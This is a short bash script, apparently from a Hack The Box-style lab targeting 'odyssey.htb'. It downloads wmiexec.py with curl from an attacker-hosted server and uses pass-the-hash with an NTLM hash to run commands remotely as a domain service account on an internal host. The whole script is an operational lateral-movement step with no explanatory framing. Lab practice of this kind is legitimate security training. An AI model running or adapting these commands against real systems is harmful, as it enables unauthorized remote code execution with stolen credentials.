#!/bin/bash
export PYTHONPATH=/tmp/pylibs
cd /tmp
curl -fsSL -o /tmp/wmiexec.py http://10.10.15.183:8090/wmiexec.py
python3 /tmp/wmiexec.py -hashes :3a5026b2aa5ef2cbb7cb6a7be3a2bcfa odyssey.htb/svc-aegis-deploy@172.16.0.10 "whoami" 2>&1 | tee /tmp/wmi_test.out
echo WMI_TEST_DONE
